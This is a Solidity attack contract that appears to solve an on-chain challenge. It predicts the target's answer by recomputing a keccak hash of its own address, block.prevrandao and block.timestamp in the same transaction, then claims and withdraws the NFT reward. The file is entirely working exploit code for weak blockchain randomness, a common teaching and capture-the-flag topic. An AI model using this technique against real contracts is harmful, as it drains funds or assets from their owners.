// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ITargetContract {
    function solveChallenge(uint256 randomGuess, string memory yourTwitterHandle) external;
}

interface INFTContract {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract Attack is IERC721Receiver {
    error Attack__NotTheOwner();

    ITargetContract public targetContact;
    INFTContract public nftContract;
    address owner;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert Attack__NotTheOwner();
        }
        _;
    }

    constructor(address _targetContract, address _nftContractAddress) {
        targetContact = ITargetContract(_targetContract);
        nftContract = INFTContract(_nftContractAddress);
        owner = msg.sender;
    }

    function solve(string memory yourTwitterHandle) external {
        uint256 correctAnswer = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 100000;

        targetContact.solveChallenge(correctAnswer, yourTwitterHandle);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function transferMyNFT(uint256 tokenId) external onlyOwner {
        nftContract.safeTransferFrom(address(this), msg.sender, tokenId);
    }
}